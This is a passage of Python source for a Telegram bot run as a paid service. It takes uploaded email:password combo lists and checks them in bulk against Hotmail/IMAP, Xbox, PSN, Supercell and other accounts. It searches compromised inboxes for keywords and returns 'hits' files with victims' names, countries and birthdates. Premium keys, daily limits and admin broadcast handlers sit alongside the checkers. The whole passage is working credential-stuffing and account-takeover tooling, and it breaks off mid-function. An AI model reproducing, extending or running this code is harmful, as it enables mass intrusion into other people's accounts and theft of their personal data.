            elif state == "waiting_brute_root_file":
                session["state"] = None
                await update.message.reply_text(f"⚡ **Starting Brute Root (Advanced)**\n\n📊 Combos: {len(unique_lines):,}\n⚡ Threads: 30\n🔄 Duplicates removed: {removed_count}\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN)
                asyncio.create_task(self._start_brute_root_scan(user_id, unique_lines, 30, context))

            elif state == "waiting_rewards_file":
                session["state"] = None
                await update.message.reply_text(f"💎 **Starting Rewards Cracker**\n\n📊 Combos: {len(unique_lines):,}\n⚡ Threads: 30\n🔄 Duplicates removed: {removed_count}\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN)
                asyncio.create_task(self._start_rewards_scan(user_id, unique_lines, 30, context))
            elif state == "waiting_psn_file":
                session["state"] = None
                await update.message.reply_text(f"🎮 **Starting PSN Scan**\n\n📊 Combos: {len(unique_lines):,}\n⚡ Threads: 30\n🔄 Duplicates removed: {removed_count}\n\nResults will be saved in:\n• `psn_hits.txt` - Accounts with PSN orders\n• `psn_free.txt` - Valid accounts without PSN\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN)
                asyncio.create_task(self._start_psn_scan(user_id, unique_lines, 30, context))

            elif state == "waiting_imap_file":
                session["state"] = None
                await update.message.reply_text(f"📧 **Starting IMAP Scan**\n\n📊 Combos: {len(unique_lines):,}\n⚡ Threads: 30\n🔄 Duplicates removed: {removed_count}\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN)
                asyncio.create_task(self._start_imap_scan(user_id, unique_lines, 30, context))
            elif state == "waiting_imap_inboxer_keywords":
                keywords = [k.strip() for k in text.split('\n') if k.strip()]
                if not keywords:
                    await update.message.reply_text("❌ No keywords provided. Please send at least one keyword.", parse_mode=ParseMode.MARKDOWN)
                    return
                session["imap_inboxer_keywords"] = keywords
                session["state"] = "waiting_imap_inboxer_file"
                await update.message.reply_text(f"📧 **IMAP Inboxer**\n\nKeywords set: {len(keywords)} keywords\n```\n" + "\n".join(keywords[:10]) + ("\n..." if len(keywords) > 10 else "") + "```\n\nNow send your combo file (txt format)\nFormat: `email:password`\n\nThe bot will validate each account and search for these keywords in the inbox.\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker"))
            elif state == "waiting_imap_inboxer_file":
                keywords = session.get("imap_inboxer_keywords", [])
                if not keywords:
                    await update.message.reply_text("No keywords set. Please start over.", parse_mode=ParseMode.MARKDOWN)
                    return
                session["state"] = None
                await update.message.reply_text(f"📧 **Starting IMAP Inboxer Scan**\n\n📊 Combos: {len(unique_lines):,}\n🔑 Keywords: {len(keywords)}\n⚡ Threads: 30\n🔄 Duplicates removed: {removed_count}\n\nResults will be saved in separate files per keyword.\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN)
                asyncio.create_task(self._start_imap_inboxer_scan(user_id, unique_lines, keywords, 30, context))
            elif state == "waiting_hotmail_bruter_file":
                session["state"] = None
                await update.message.reply_text(f"🔥 **Starting Hotmail Bruter Scan**\n\n📊 Combos: {len(unique_lines):,}\n⚡ Threads: 30\n🔄 Duplicates removed: {removed_count}\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN)
                asyncio.create_task(self._start_hotmail_bruter_scan(user_id, unique_lines, 30, context))
            elif state == "waiting_inboxer_file":
                keyword = session.get("custom_keyword")
                if not keyword:
                    await update.message.reply_text("No service set.")
                    return
                session["state"] = None
                await update.message.reply_text(f"📧 **Starting Custom Inboxer: '{keyword}'**\n\n📊 Combos: {len(unique_lines):,}\n⚡ Threads: 30\n🔄 Duplicates removed: {removed_count}\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN)
                asyncio.create_task(self._start_preloaded_scan(user_id, unique_lines, [keyword], 30, context))

            elif state == "waiting_country_file":
                countries = session.get("selected_countries", [])
                session["state"] = None
                await update.message.reply_text(
                    f"🌍 **Starting Country Cracker**\n\n📊 Combos: {len(unique_lines):,}\n🌎 Countries: {', '.join(countries) if countries else 'ALL'}\n⚡ Threads: 30\n🔄 Duplicates removed: {removed_count}\n\nThe bot will extract country info from each account.\n\nUse /live to view real-time stats!",
                    parse_mode=ParseMode.MARKDOWN
                )
                # Import the country cracker engine
                try:
                    from country_cracker_engine import CountryCrackerEngine
                    asyncio.create_task(self._start_country_scan(user_id, unique_lines, countries, 30, context))
                except ImportError as ie:
                    logger.error(f"Failed to import CountryCrackerEngine: {ie}")
                    await update.message.reply_text("❌ Country Cracker engine not available. Please try another mode.", parse_mode=ParseMode.MARKDOWN)
            elif state == "waiting_full_scan_file":
                session["state"] = None
                await update.message.reply_text(
                    f"🚀 **Starting FULL SCAN (All Features)**\n\n📊 Combos: {len(unique_lines):,}\n⚡ Threads: 30\n🔄 Duplicates removed: {removed_count}\n\nRunning: Brute • Minecraft • IMAP\n\nCombined results in ONE ZIP file!\n\nUse /live to view real-time stats!",
                    parse_mode=ParseMode.MARKDOWN
                )
                asyncio.create_task(self._start_full_scan(user_id, unique_lines, 30, context))
            elif state == "waiting_xbox_file":
                session["state"] = None
                await update.message.reply_text(f"🎮 **Starting Xbox Cracker Scan**\n\n📊 Combos: {len(unique_lines):,}\n⚡ Threads: 20\n🔄 Duplicates removed: {removed_count}\n\nResults:\n• Xbox Live status\n• Xbox Game Pass type\n• Gamertag & Profile\n• Email Access\n• 2FA detection\n• Premium breakdown\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN)
                asyncio.create_task(self._start_xbox_cracker_scan(user_id, unique_lines, 20, context))
            elif state == "waiting_xbox_engine_file":
                session["state"] = None
                await update.message.reply_text(f"🎮 **Starting Xbox Advanced Scan (+ Minecraft + GamePass)**\n\n📊 Combos: {len(unique_lines):,}\n⚡ Threads: 20\n🔄 Duplicates removed: {removed_count}\n\nResults:\n• Minecraft Accounts\n• Xbox Game Pass Status\n• Xbox Live Premium\n• Gamertag & Profile\n• Game entitlements\n• Email Access\n• 2FA detection\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN)
                asyncio.create_task(self._start_xbox_engine_scan(user_id, unique_lines, 20, context))
            elif state == "waiting_supercell_file":
                session["state"] = None
                await update.message.reply_text(f"🍀 **Starting Supercell Cracker Scan**\n\n📊 Combos: {len(unique_lines):,}\n⚡ Threads: 20\n🔄 Duplicates removed: {removed_count}\n\nResults:\n• Clash of Clans\n• Clash Royale\n• Brawl Stars\n• Account info\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN)
                asyncio.create_task(self._start_supercell_cracker_scan(user_id, unique_lines, 20, context))
            else:
                logger.warning(f"Invalid upload state for user {user_id}: state={state}")
                session["state"] = None
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("📋 Preloaded", callback_data="cracker_preloaded"), InlineKeyboardButton("⚡ Brute", callback_data="cracker_brute")],
                    [InlineKeyboardButton("💎 Rewards", callback_data="cracker_rewards"), InlineKeyboardButton("🎮 PSN", callback_data="cracker_psn")],
                    [InlineKeyboardButton("🎮 Xbox", callback_data="cracker_xbox"), InlineKeyboardButton("🎮 Xbox+MC+GP", callback_data="cracker_xbox_engine")],
                    [InlineKeyboardButton("🍀 Supercell", callback_data="cracker_supercell"), InlineKeyboardButton("📧 IMAP", callback_data="cracker_imap")],
                    [InlineKeyboardButton("🔥 Hotmail", callback_data="cracker_hotmail_bruter"), InlineKeyboardButton("🌍 Country", callback_data="cracker_country")]
                ])
                await update.message.reply_text("❌ **Session expired or invalid mode**\n\nThis can happen if you took too long to upload.\n\n**Select a cracker mode to continue:**", parse_mode=ParseMode.MARKDOWN, reply_markup=keyboard)
        except FileError as fe:
            logger.error(f"File error for user {user_id}: {fe}")
            await update.message.reply_text("❌ **Error reading file**\n\nMake sure the file is in text format (TXT) and properly formatted.", parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            error_msg = handle_error(e, "File handling in document handler", user_id)
            logger.exception(f"Full traceback for document handler error: {e}")
            await update.message.reply_text(error_msg, parse_mode=ParseMode.MARKDOWN)

    # ==================== TEXT HANDLER ====================
    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        # Safety check: ensure user exists
        if not update.effective_user:
            logger.warning("Received message with no user info - ignoring")
            return
        
        user_id = update.effective_user.id
        if not update.message or not update.message.text:
            return
        
        text = update.message.text.strip()
        session = self.user_sessions.get(user_id, {})
        state = session.get("state")
        ki_mode = session.get("ki_mode")
        
        # ==================== KEYWORD INBOX MANUAL INPUT ====================
        if ki_mode == "keywords_manual":
            # Parse manual keywords - support both comma-separated and line-separated
            if ',' in text:
                keywords = [k.strip().lower() for k in text.split(',') if k.strip()]
            else:
                keywords = [k.strip().lower() for k in text.split('\n') if k.strip()]
            
            if not keywords:
                await update.message.reply_text("❌ No keywords provided!\n\nPlease enter at least one keyword.")
                return
            
            self.user_sessions[user_id]["ki_keywords"] = keywords
            self.user_sessions[user_id]["ki_mode"] = None
            self.user_sessions[user_id]["ki_step"] = "combos"
            
            await update.message.reply_text(
                f"✅ *Keywords Saved!*\n\n"
                f"📊 Total: {len(keywords)}\n"
                f"📝 Keywords: {', '.join(keywords[:10])}{'...' if len(keywords) > 10 else ''}\n\n"
                f"Next: Choose combos input method",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("📁 Upload Combos", callback_data="ki_upload_combos"),
                    InlineKeyboardButton("📝 Manual Combos", callback_data="ki_manual_combos")
                ]])
            )
            return
        
        if ki_mode == "combos_manual":
            # Parse manual combos - must be email:password format
            combos = [line.strip() for line in text.split('\n') if ':' in line.strip()]
            
            if not combos:
                await update.message.reply_text(
                    "❌ No valid combos found!\n\n"
                    "Please use format: `email:password`\n"
                    "One combo per line",
                    parse_mode="Markdown"
                )
                return
            
            self.user_sessions[user_id]["ki_combos"] = combos
            self.user_sessions[user_id]["ki_mode"] = None
            self.user_sessions[user_id]["ki_step"] = "ready"
            keywords = self.user_sessions.get(user_id, {}).get("ki_keywords", [])
            
            await update.message.reply_text(
                f"✅ *Combos Saved!*\n\n"
                f"📊 Combos: {len(combos)}\n"
                f"📋 Keywords: {len(keywords)}\n\n"
                f"✨ Everything ready to scan!",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🚀 Start Scan", callback_data="ki_start_scan"),
                    InlineKeyboardButton("📝 Change Keywords", callback_data="ki_redo_keywords"),
                    InlineKeyboardButton("❌ Cancel", callback_data="ki_cancel")
                ]])
            )
            return
            if state == "waiting_multiple_files" or (not state and session.get("merged_combos")):
                # Add to accumulated combos
                if "merged_combos" not in session:
                    session["merged_combos"] = []
                
                session["merged_combos"].extend(unique_lines)
                total_combos = len(session["merged_combos"])
                
                # Show merge options
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton(f"➕ Add More Files ({total_combos} total)", callback_data="multi_add_more")],
                    [InlineKeyboardButton(f"✅ Done - Finalize", callback_data="multi_done")]
                ])
                
                await update.message.reply_text(
                    f"✅ **File Merged Successfully!**\n\n"
                    f"📊 This file: {len(unique_lines):,} combos\n"
                    f"📦 Total accumulated: **{total_combos:,}** combos\n"
                    f"🔄 Duplicates removed: {removed_count}\n\n"
                    f"**What's next?**\n"
                    f"• ➕ Upload more files to merge together\n"
                    f"• ✅ Done? I'll show you cracker mode options",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=keyboard
                )
                session["state"] = "waiting_multiple_files"
                return
        if not state:
            return
        if state == "waiting_inboxer_keyword":
            session["state"] = "waiting_inboxer_file"
            session["custom_keyword"] = text
            await update.message.reply_text(f"📧 **Service Set:** `{text}`\n\nNow send your combo file (txt format)\nFormat: `email:password`", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker"))
            return
        if state == "waiting_imap_inboxer_keywords":
            keywords = [k.strip() for k in text.split('\n') if k.strip()]
            if not keywords:
                await update.message.reply_text("❌ No keywords provided. Please send at least one keyword.", parse_mode=ParseMode.MARKDOWN)
                return
            session["imap_inboxer_keywords"] = keywords
            session["state"] = "waiting_imap_inboxer_file"
            await update.message.reply_text(f"📧 **IMAP Inboxer**\n\nKeywords set: {len(keywords)} keywords\n```\n" + "\n".join(keywords[:10]) + ("\n..." if len(keywords) > 10 else "") + "```\n\nNow send your combo file (txt format)\nFormat: `email:password`\n\nThe bot will validate each account and search for these keywords in the inbox.\n\nUse /live to view real-time stats!", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker"))
            return

        if state == "waiting_custom_days":
            try:
                days = float(text)
                if days <= 0:
                    raise ValueError
                key = self.key_manager.generate_key(days)
                session["state"] = None
                await update.message.reply_text(f"**🔑 Key Generated**\n\nDuration: {days} days\nKey: `{key}`", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_admin_keyboard())
            except:
                await update.message.reply_text("❌ Invalid number. Try again.")
            return
        if state == "waiting_bulk":
            try:
                parts = text.split(',')
                count = int(parts[0])
                days = float(parts[1])
                keys = []
                for _ in range(count):
                    keys.append(self.key_manager.generate_key(days))
                keys_text = "\n".join([f"`{k}`" for k in keys])
                session["state"] = None
                await update.message.reply_text(f"**📦 Generated {count} Keys**\n\nDuration: {days} days each\n\n{keys_text[:4000]}", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_admin_keyboard())
            except:
                await update.message.reply_text("❌ Invalid format. Use: `count,days`")
            return
        if state == "waiting_add_premium":
            try:
                parts = text.split(',')
                uid = int(parts[0])
                days = float(parts[1])
                self.key_manager.add_premium_manual(uid, days)
                session["state"] = None
                await update.message.reply_text(f"✅ **Premium Added**\n\nUser ID: `{uid}`\nDays: {days}", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_admin_keyboard())
            except:
                await update.message.reply_text("❌ Invalid format. Use: `user_id,days`")
            return
        if state == "waiting_del_key":
            session["state"] = None
            if self.key_manager.delete_key(text):
                await update.message.reply_text("Key deleted.", reply_markup=self.get_admin_keyboard())
            else:
                await update.message.reply_text("Key not found.", reply_markup=self.get_admin_keyboard())
            return
        if state == "waiting_del_redeemed_key":
            session["state"] = None
            success, msg = self.key_manager.delete_redeemed_key(text.strip())
            if success:
                await update.message.reply_text(f"✅ {msg}\n\n**Premium access revoked from user.**", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_admin_keyboard())
            else:
                await update.message.reply_text(f"❌ {msg}", reply_markup=self.get_admin_keyboard())
            return
        if state == "waiting_confirm_del_all":
            if text.upper() == "CONFIRM":
                self.key_manager.delete_all_keys()
                await update.message.reply_text("All keys deleted.", reply_markup=self.get_admin_keyboard())
            else:
                await update.message.reply_text("Cancelled.", reply_markup=self.get_admin_keyboard())
            session["state"] = None
            return
        if state == "waiting_ban_user":
            BAN_ADMIN = 8134424193
            if user_id != BAN_ADMIN:
                await update.message.reply_text("⛔ Only admin 8134424193 can ban users!")
                session["state"] = None
                return
            try:
                target_id = int(text.strip())
                if self.key_manager.ban_user(target_id):
                    await update.message.reply_text(f"✅ User {target_id} has been banned.", reply_markup=self.get_admin_keyboard())
                    try:
                        await context.bot.send_message(chat_id=target_id, text="🚫 You have been banned from using this bot.\nContact @NoMan8x8 if you think this is a mistake.")
                    except:
                        pass
                else:
                    await update.message.reply_text(f"❌ User {target_id} not found or already banned.", reply_markup=self.get_admin_keyboard())
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID format.", reply_markup=self.get_admin_keyboard())
            session["state"] = None
            return
        if state == "waiting_unban_user":
            BAN_ADMIN = 8134424193
            if user_id != BAN_ADMIN:
                await update.message.reply_text("⛔ Only admin 8134424193 can unban users!")
                session["state"] = None
                return
            try:
                target_id = int(text.strip())
                if self.key_manager.unban_user(target_id):
                    await update.message.reply_text(f"✅ User {target_id} has been unbanned.", reply_markup=self.get_admin_keyboard())
                    try:
                        await context.bot.send_message(chat_id=target_id, text="✅ You have been unbanned. You can now use the bot again.")
                    except:
                        pass
                else:
                    await update.message.reply_text(f"❌ User {target_id} not found or not banned.", reply_markup=self.get_admin_keyboard())
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID format.", reply_markup=self.get_admin_keyboard())
            session["state"] = None
            return
        if state == "waiting_broadcast":
            BROADCAST_ADMIN = 8134424193
            if user_id != BROADCAST_ADMIN:
                await update.message.reply_text("⛔ Only admin 8134424193 can broadcast!")
                session["state"] = None
                return
            session["state"] = None
            await self._broadcast_message(context, text, update.effective_chat.id)
            return
        if state == "waiting_gift_lines":
            try:
                lines = int(text.strip())
                if lines <= 0:
                    raise ValueError
                session["gift_lines"] = lines
                session["state"] = "waiting_gift_days"
                await update.message.reply_text(
                    "✅ Lines set to **{:,}**\n\n".format(lines) +
                    "Now, how many days should this bonus be valid?\n\n"
                    "Examples:\n• 1 (1 day)\n• 3 (3 days)\n• 7 (1 week)\n\n"
                    "Send the number of days below:",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=self.get_cancel_keyboard("menu_admin")
                )
            except:
                await update.message.reply_text("❌ Invalid number. Please send a positive number like: 5000")
            return
        if state == "waiting_gift_days":
            try:
                days = int(text.strip())
                if days <= 0:
                    raise ValueError
                lines = session.get("gift_lines", 0)
                
                # Give free lines to all users
                updated_count = self.key_manager.give_free_lines_to_all_users(lines, days)
                
                # Clear session
                session["state"] = None
                session.pop("gift_lines", None)
                
                # Send notification to all users
                users = self.key_manager.get_all_users()
                notification_count = 0
                failed_count = 0
                
                for uid_str in users.keys():
                    try:
                        uid = int(uid_str)
                        notification_text = (
                            f"🎁 **Free Admin Gift!** 🎉\n\n"
                            f"You've been gifted **{lines:,} FREE lines** for **{days} day(s)**!\n\n"
                            f"⏱️ Valid until: {(datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')}\n\n"
                            f"🔥 Enjoy your extra lines!\n"
                            f"— @nomenxyz"
                        )
                        await context.bot.send_message(chat_id=uid, text=notification_text, parse_mode=ParseMode.MARKDOWN)
                        notification_count += 1
                    except:
                        failed_count += 1
                
                # Confirm to admin with detailed stats
                await update.message.reply_text(
                    f"🎁 **Free Gift Lines Campaign Complete!**\n\n"
                    f"✅ Database updated: **{updated_count} users**\n"
                    f"📬 Notifications sent: **{notification_count} users**\n"
                    f"❌ Failed notifications: **{failed_count}**\n\n"
                    f"📦 Lines gifted: **{lines:,}**\n"
                    f"⏱️ Duration: **{days} day(s)**\n"
                    f"📅 Valid until: {(datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')}\n\n"
                    f"Users can now use their bonus lines immediately!",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=self.get_admin_keyboard()
                )
                
                logger.info(f"Free gift campaign: {lines} lines for {days} days | Updated: {updated_count} | Notified: {notification_count} | Failed: {failed_count}")
            except:
                await update.message.reply_text("❌ Invalid number. Please send a positive number like: 1, 3, 7")
            return
        if state == "waiting_giveaway_keys":
            try:
                num_keys = int(text.strip())
                if num_keys < 1 or num_keys > 20:
                    await update.message.reply_text("❌ Please enter a number between 1 and 20.", parse_mode=ParseMode.MARKDOWN)
                    return
                
                session["giveaway_keys_count"] = num_keys
                session["state"] = "waiting_giveaway_key_values"
                session["giveaway_collected_keys"] = []
                
                await update.message.reply_text(
                    f"🎁 **Send Giveaway Keys**\n\n"
                    f"Total keys needed: **{num_keys}**\n\n"
                    f"Send each key on a separate line (or comma-separated):\n\n"
                    f"Example:\n`key1`\n`key2`\n`key3`\n",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=self.get_cancel_keyboard("menu_admin")
                )
            except:
                await update.message.reply_text("❌ Invalid number. Please send a number like: 4, 5, 10")
            return
        
        if state == "waiting_giveaway_key_values":
            # Parse keys - support both line-separated and comma-separated
            if ',' in text:
                keys = [k.strip() for k in text.split(',') if k.strip()]
            else:
                keys = [k.strip() for k in text.split('\n') if k.strip()]
            
            required = session.get("giveaway_keys_count", 0)
            
            if len(keys) != required:
                await update.message.reply_text(
                    f"❌ You provided {len(keys)} key(s), but {required} are required.\n\n"
                    f"Send all {required} keys again (one per line):",
                    parse_mode=ParseMode.MARKDOWN
                )
                return
            
            # Start giveaway
            if self.giveaway_manager.start_giveaway(keys):
                session["state"] = None
                session.pop("giveaway_keys_count", None)
                session.pop("giveaway_collected_keys", None)
                
                await update.message.reply_text(
                    f"✅ **Giveaway Started!**\n\n"
                    f"🎁 Keys: {len(keys)}\n"
                    f"⏰ Status: 🟢 ACTIVE\n\n"
                    f"Now broadcasting to users...",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=self.get_admin_keyboard()
                )
                
                # Broadcast giveaway to all users
                await self._broadcast_giveaway_start(context, len(keys))
            else:
                await update.message.reply_text("❌ Error starting giveaway. Try again.", reply_markup=self.get_admin_keyboard())
            return
        
        if state == "waiting_country_selection":
            countries = [c.strip().upper() for c in text.split(',') if c.strip()]
            session["selected_countries"] = countries if countries else []
            session["state"] = "waiting_country_file"
            
            country_display = ", ".join(countries) if countries else "ALL COUNTRIES"
            await update.message.reply_text(
                f"🌍 **Country Cracker**\n\n✅ Filter: `{country_display}`\n\n**Send your combo file (txt format)**\nFormat: `email:password`\n\nThe bot will:\n1. Check each account\n2. Extract country info\n3. Save matches filtering by country\n\nMax: 10,000 lines | 20MB",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_cancel_keyboard("menu_cracker")
            )
            return

    # ==================== UTILITY METHODS ===================="
    async def _check_membership(self, user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
        """Check if user has joined all required channels - EXACT method from inboxbot (2).py"""
        if not self.channels:
            return True
        try:
            for url, username in self.channels:
                try:
                    try:
                        # Try with @username format first
                        member = await context.bot.get_chat_member(chat_id=f"@{username}", user_id=user_id)
                    except Exception:
                        try:
                            # Try without @ format
                            member = await context.bot.get_chat_member(chat_id=username, user_id=user_id)
                        except Exception:
                            # Can't verify - continue to next channel
                            logger.debug(f"Can't verify {username} for user {user_id}")
                            continue
                    
                    # Check if user is NOT a member
                    if member.status in ["left", "kicked", "banned"]:
                        logger.warning(f"❌ User {user_id} not member of {username} (status: {member.status})")
                        return False
                    else:
                        logger.info(f"✅ User {user_id} verified in {username}")
                except Exception:
                    # Silently continue on any error
                    continue
            
            logger.info(f"✅ User {user_id} verified in all channels")
            return True
        except Exception as e:
            logger.error(f"Membership check error: {e}")
            return True  # Allow if check fails

    async def _broadcast_message(self, context: ContextTypes.DEFAULT_TYPE, message: str, chat_id: int):
        """Broadcast a message to all users"""
        sent = 0
        failed = 0
        users = self.key_manager.get_all_users()
        for uid in users:
            try:
                await context.bot.send_message(chat_id=int(uid), text=f"📢 **Broadcast**\n\n{message}", parse_mode=ParseMode.MARKDOWN)
                sent += 1
                await asyncio.sleep(0.1)
            except:
                failed += 1
        await context.bot.send_message(chat_id=chat_id, text=f"📢 **Broadcast Complete**\n\n✅ Sent: {sent}\n❌ Failed: {failed}", parse_mode=ParseMode.MARKDOWN)

    async def _start_xbox_cracker_scan(self, user_id: int, combos: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        """Start Xbox Cracker scan"""
        if user_id not in self.user_sessions:
            self.user_sessions[user_id] = {"chat_id": user_id}
        
        chat_id = self.user_sessions[user_id].get("chat_id", user_id)
        
        unique_combos, removed_count = remove_duplicates(combos)
        if removed_count > 0:
            await context.bot.send_message(chat_id=chat_id, text=f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_combos)} unique combos remaining.")
        
        tier = self._get_user_tier(user_id)
        is_premium = self.key_manager.is_premium(user_id)
        limit = PREMIUM_TIERS[tier]["daily_limit"]
        max_threads = PREMIUM_TIERS[tier]["max_threads"]
        threads = min(threads, max_threads)
        
        scan_stats = LiveStats()
        if not chat_id:
            return
        
        # Only enforce daily limit for FREE users - AFTER validation
        if not is_premium:
            daily_used = self.key_manager.get_daily_used(user_id)
            if daily_used + len(unique_combos) > limit:
                await context.bot.send_message(chat_id=chat_id, text=f"❌ Daily limit reached ({limit} lines). Upgrade to premium.")
                return
            if not self.key_manager.add_daily_used(user_id, len(unique_combos)):
                await context.bot.send_message(chat_id=chat_id, text="❌ Daily limit reached.")
                return
        
        progress_cb = self._create_live_progress_callback(chat_id, user_id, context, scan_stats)
        scan_stats.set_progress_callback(progress_cb)
        scan_stats.start(len(unique_combos))
        stop_event = Event()
        self.active_scans[user_id] = {'stop_event': stop_event, 'stats': scan_stats}
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        await self._show_live_stats(chat_id, user_id, context)
        hits = []
        bad = 0
        errors = 0
        results_lock = Lock()
        executor = ThreadPoolExecutor(max_workers=threads)
        loop = asyncio.get_running_loop()
        futures = []

        def worker(combo):
            nonlocal bad, errors
            if stop_event.is_set():
                return
            try:
                email, pwd = combo.split(':', 1)
                email, pwd = email.strip(), pwd.strip()
                scan_stats.increment_checked()
                if self.xbox_cracker_engine:
                    result = self.xbox_cracker_engine.check_account(email, pwd)
                    if result.get('status') == 'HIT':
                        scan_stats.increment_hits()
                        with results_lock:
                            hits.append(f"{email}:{pwd}|{result.get('xbox_status', 'Unknown')}")
                    else:
                        scan_stats.increment_bad()
                        with results_lock:
                            bad += 1
                else:
                    scan_stats.increment_errors()
            except Exception as e:
                scan_stats.increment_errors()
                logger.error(f"Xbox Cracker error: {e}")

        for combo in unique_combos:
            futures.append(loop.run_in_executor(executor, worker, combo))
        for coro in asyncio.as_completed(futures):
            if stop_event.is_set():
                break
            try:
                await coro
            except:
                pass
        executor.shutdown(wait=True)
        scan_stats.stop()
        if user_id in self.active_scans:
            del self.active_scans[user_id]
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        final = scan_stats.get_snapshot()
        result_msg = f"✅ **XBOX CRACKER SCAN COMPLETED!**\n\n```\n📊 Total:     {final['total']:,}\n🎮 Xbox Hits: {final['hits']:,}\n❌ Bad:       {final['bad']:,}\n```\n\n⏱️ Time: {final['elapsed']}"
        if hits:
            xbox_results_text = "\n".join(hits)
            try:
                await context.bot.send_document(chat_id=chat_id, document=InputFile(io.BytesIO(xbox_results_text.encode()), filename=f"xbox_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"), caption=result_msg, parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode=ParseMode.MARKDOWN)
        else:
            await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode=ParseMode.MARKDOWN)
        self.key_manager.update_user_stats(user_id, len(unique_combos), len(hits))

    async def _start_supercell_cracker_scan(self, user_id: int, combos: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        """Start Supercell Cracker scan"""
        if user_id not in self.user_sessions:
            self.user_sessions[user_id] = {"chat_id": user_id}
        
        chat_id = self.user_sessions[user_id].get("chat_id", user_id)
        
        unique_combos, removed_count = remove_duplicates(combos)
        if removed_count > 0:
            await context.bot.send_message(chat_id=chat_id, text=f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_combos)} unique combos remaining.")
        
        tier = self._get_user_tier(user_id)
        is_premium = self.key_manager.is_premium(user_id)
        limit = PREMIUM_TIERS[tier]["daily_limit"]
        max_threads = PREMIUM_TIERS[tier]["max_threads"]
        threads = min(threads, max_threads)
        
        scan_stats = LiveStats()
        if not chat_id:
            return
        
        # Only enforce daily limit for FREE users - AFTER validation
        if not is_premium:
            daily_used = self.key_manager.get_daily_used(user_id)
            if daily_used + len(unique_combos) > limit:
                await context.bot.send_message(chat_id=chat_id, text=f"❌ Daily limit reached ({limit} lines). Upgrade to premium.")
                return
            if not self.key_manager.add_daily_used(user_id, len(unique_combos)):
                await context.bot.send_message(chat_id=chat_id, text="❌ Daily limit reached.")
                return
        
        progress_cb = self._create_live_progress_callback(chat_id, user_id, context, scan_stats)
        scan_stats.set_progress_callback(progress_cb)
        scan_stats.start(len(unique_combos))
        stop_event = Event()
        self.active_scans[user_id] = {'stop_event': stop_event, 'stats': scan_stats}
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        await self._show_live_stats(chat_id, user_id, context)
        supercell_hits = []  # Accounts WITH Supercell games
        valid_accounts = []  # Valid accounts WITHOUT Supercell games
        bad = 0
        errors = 0
        results_lock = Lock()
        executor = ThreadPoolExecutor(max_workers=threads)
        loop = asyncio.get_running_loop()
        futures = []

        def worker(combo):
            nonlocal bad, errors, supercell_hits, valid_accounts
            if stop_event.is_set():
                return
            try:
                email, pwd = combo.split(':', 1)
                email, pwd = email.strip(), pwd.strip()
                scan_stats.increment_checked()
                if self.supercell_engine:
                    result = self.supercell_engine.check_account(email, pwd)
                    if result:
                        status = result.get('status')
                        # Count ANY valid account as HIT (supercell or valid_no_games)
                        if status in ['supercell', 'valid', 'valid_no_games']:
                            scan_stats.increment_hits()
                            with results_lock:
                                if status == 'supercell':
                                    # Has Supercell games - add to supercell_hits with full details
                                    games = []
                                    if result.get('clash_royale'):
                                        games.append("Clash Royale")
                                    if result.get('brawl_stars'):
                                        games.append("Brawl Stars")
                                    if result.get('clash_of_clans'):
                                        games.append("Clash of Clans")
                                    if result.get('hay_day'):
                                        games.append("Hay Day")
                                    games_str = " | ".join(games) if games else "Unknown"
                                    
                                    # Full capture with all details
                                    country = result.get('country', 'Unknown')
                                    name = result.get('name', 'Unknown')
                                    birthdate = result.get('birthdate', 'Unknown')
                                    messages = result.get('total_messages', 0)
                                    last_msg = result.get('last_message', 'Not Found')
                                    
                                    full_result = (
                                        f"{email}:{pwd} | "
                                        f"Games: {games_str} | "
                                        f"Name: {name} | "
                                        f"Country: {country} | "
                                        f"Birth: {birthdate} | "
                                        f"Messages: {messages} | "
                                        f"Last Msg: {last_msg}"
                                    )
                                    supercell_hits.append(full_result)
